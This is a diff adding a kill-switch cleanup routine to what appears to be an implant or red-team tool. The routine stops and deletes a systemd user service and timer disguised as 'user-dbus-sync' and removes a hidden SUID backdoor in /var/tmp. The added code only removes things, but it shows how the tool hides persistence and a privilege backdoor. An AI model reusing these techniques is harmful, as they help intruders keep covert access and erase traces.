@@ -48,6 +48,36 @@ def check_kill_switch():
                 print(f"[*] Deleted {f}")
             except Exception as e:
                 print(f"[-] Could not delete {f}: {e}")
+                
+             # Remove systemd persistence
+            systemd_user_dir = os.path.expanduser("~/.config/systemd/user")
+            service_name = "user-dbus-sync"
+            
+            subprocess.run(["systemctl", "--user", "stop", f"{service_name}.timer"], stderr=subprocess.DEVNULL)
+            subprocess.run(["systemctl", "--user", "disable", f"{service_name}.timer"], stderr=subprocess.DEVNULL)
+            subprocess.run(["systemctl", "--user", "stop", f"{service_name}.service"], stderr=subprocess.DEVNULL)
+            subprocess.run(["systemctl", "--user", "disable", f"{service_name}.service"], stderr=subprocess.DEVNULL)
+            
+            for f in [
+                os.path.join(systemd_user_dir, f"{service_name}.service"),
+                os.path.join(systemd_user_dir, f"{service_name}.timer"),
+                os.path.join(systemd_user_dir, "timers.target.wants", f"{service_name}.timer"),
+            ]:
+                try:
+                    os.remove(f)
+                    print(f"[*] Deleted {f}")
+                except Exception as e:
+                    print(f"[-] Could not delete {f}: {e}")
+            
+            subprocess.run(["systemctl", "--user", "daemon-reload"], stderr=subprocess.DEVNULL)
+    
+            
+            # Remove SUID backdoor
+            try:
+                os.remove("/var/tmp/.cache_sys")
+                print("[*] Deleted SUID backdoor")
+            except Exception as e:
+                print(f"[-] Could not delete SUID backdoor: {e}")
             return True 
         
         print(f"Flag still exists (Status: {response.status_code}). Standing by.")
